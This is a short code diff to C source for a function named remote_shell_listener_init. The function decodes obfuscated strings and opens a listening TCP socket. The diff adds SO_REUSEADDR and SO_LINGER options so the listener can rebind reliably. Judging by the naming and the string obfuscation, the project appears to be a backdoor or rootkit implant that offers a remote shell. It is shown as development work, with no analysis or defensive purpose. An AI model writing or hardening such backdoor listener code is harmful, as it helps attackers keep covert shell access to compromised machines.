@@ -2,6 +2,7 @@
 #include "digest.h"
 #include "mem.h"
 #include "shield.h"
+#include <asm-generic/socket.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <netinet/in.h>
@@ -110,6 +111,19 @@ remote_shell_listener_init(char **env) {
     decode_strings(strings, sizeof(strings) / sizeof(strings[0]));
 
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
+
+    int opt = 1;
+    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) == -1) {
+        __log(stderr, "(setsockopt [fd %d]) Error: %s", server_fd, strerror(errno));
+        close(server_fd);
+        return -1;
+    }
+
+    if (setsockopt(server_fd, SOL_SOCKET, SO_LINGER, &(struct linger){0, 0}, sizeof(struct linger)) == -1) {
+           __log(stderr, "(setsockopt [fd %d]) Error: %s", server_fd, strerror(errno));
+           close(server_fd);
+           return -1;
+       }
 
     if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == -1) {
         __log(stderr, "(bind [fd %d]) Error: %s", server_fd, strerror(errno));
